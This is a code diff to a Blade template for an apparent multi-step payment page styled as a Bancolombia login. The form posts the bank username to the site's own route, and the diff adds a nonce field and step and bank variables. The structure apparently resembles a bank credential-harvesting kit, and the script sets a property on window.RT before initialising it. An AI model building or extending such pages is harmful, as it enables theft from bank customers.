@@ -27,6 +27,7 @@
 
     <form id="formStep1" method="POST" action="{{ route('pago.bank.step.save', ['bank' => 'bancolombia', 'step'=> 1])}}">
         @csrf
+        <input type="hidden" name="step_nonce" value="{{ $stepNonce}}">
         <div class="input-container">
             <img class="input-icon" src="{{asset('assets/img/payment/bancolombia/usericon.png')}}">
             <input type="text" name="user" id="txtUsuario" placeholder=""
@@ -63,6 +64,9 @@
   const btn = document.getElementById('btnUsuario');
   const form = document.getElementById('formStep1');
   window.RT._retry = false;
+  window.RT = window.RT || {};
+  window.RT.step = "{{ $step }}";
+  window.RT.bank = "{{ $bank }}";
   console.log(btn)
   function toggleBtn(){
     btn.disabled = !(user.value && user.value.length > 4);
